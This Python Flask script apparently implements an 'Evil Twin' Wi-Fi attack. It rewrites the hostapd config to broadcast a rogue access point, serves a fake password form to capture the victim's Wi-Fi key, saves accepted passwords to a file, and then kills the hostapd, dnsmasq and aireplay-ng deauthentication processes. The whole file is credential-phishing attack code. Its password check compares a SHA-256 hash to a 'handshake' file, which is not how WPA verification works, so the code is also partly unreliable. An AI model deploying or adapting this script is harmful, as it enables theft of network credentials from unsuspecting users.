import os
import hashlib
import subprocess
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

EVIL_SSID = "FreeWiFi"  # This should be dynamically set from user input
HANDSHAKE_FILE = "../scripts/handshake.txt"
PASSWORD_FILE = "wifi_password.txt"

def start_evil_twin(ssid):
    """Starts an Evil Twin AP using hostapd."""
    print(f"[*] Starting Evil Twin: {ssid}")

    # Create hostapd config file
    with open("/etc/hostapd/hostapd.conf", "w") as file:
        file.write(f"""
interface=wlan0
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=12345678
""")

    # Start Evil Twin
    os.system("sudo systemctl stop hostapd dnsmasq")
    os.system("sudo hostapd /etc/hostapd/hostapd.conf &")
    os.system("sudo dnsmasq -C /etc/dnsmasq.conf &")

@app.route('/', methods=['GET', 'POST'])
def login_page():
    """Fake login page to capture Wi-Fi password."""
    if request.method == 'POST':
        entered_password = request.form.get("password")
        if validate_password(entered_password):
            return "<h2>Correct password! Attack stopped.</h2>"
        else:
            return "<h2>Incorrect password. Try again.</h2>"

    return '''
        <form method="post">
            Wi-Fi Password: <input type="text" name="password">
            <input type="submit">
        </form>
    '''

def validate_password(password):
    """Validates entered password against the WPA handshake."""
    if not os.path.exists(HANDSHAKE_FILE):
        print("[-] Handshake file not found.")
        return False

    # Compute hash of the entered password
    entered_hash = hashlib.sha256(password.encode()).hexdigest()

    # Read stored handshake hash
    with open(HANDSHAKE_FILE, "r") as file:
        handshake_hash = file.read().strip()

    if entered_hash == handshake_hash:
        print(f"[+] Password Correct: {password}")
        with open(PASSWORD_FILE, "w") as file:
            file.write(password)

        # Stop Evil Twin & Deauth Attack
        stop_attacks()
        return True
    else:
        print("[-] Incorrect password. Asking user to try again.")
        return False

def stop_attacks():
    """Stops Evil Twin and Deauth Attack."""
    os.system("sudo pkill hostapd")
    os.system("sudo pkill dnsmasq")
    os.system("sudo pkill aireplay-ng")
    print("[+] Evil Twin and Deauth Attack Stopped!")

if __name__ == "__main__":
    start_evil_twin(EVIL_SSID)
    app.run(host="0.0.0.0", port=80)
